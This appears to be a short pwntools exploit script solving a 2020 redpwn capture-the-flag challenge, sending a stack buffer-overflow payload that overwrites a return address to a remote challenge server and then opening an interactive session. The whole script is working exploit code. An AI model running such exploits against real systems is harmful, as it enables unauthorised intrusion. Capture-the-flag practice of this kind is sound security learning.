from pwn import*

# io=process('./overflow-1')
io=remote("2020.redpwnc.tf",31908)
payload='a'*0x18+p64(0x4006EA)
io.recvuntil("coffer with?")
io.sendline(payload)
io.interactive()